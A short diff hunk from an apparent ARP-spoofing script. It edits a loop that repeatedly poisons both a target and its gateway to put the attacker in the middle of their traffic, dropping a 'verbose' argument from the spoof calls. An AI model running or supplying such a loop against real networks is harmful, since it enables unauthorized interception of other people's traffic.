@@ -92,9 +92,9 @@ def function_that_do_the_thing(target_ip, gateway_ip):
     try:
         while True:
             # telling the `target` that we are the `host`
-            spoof(target_ip, gateway_ip, verbose)
+            spoof(target_ip, gateway_ip)
             # telling the `host` that we are the `target`
-            spoof(gateway_ip, target_ip, verbose)
+            spoof(gateway_ip, target_ip)
             # sleep for one second
             time.sleep(1)
     except KeyboardInterrupt:
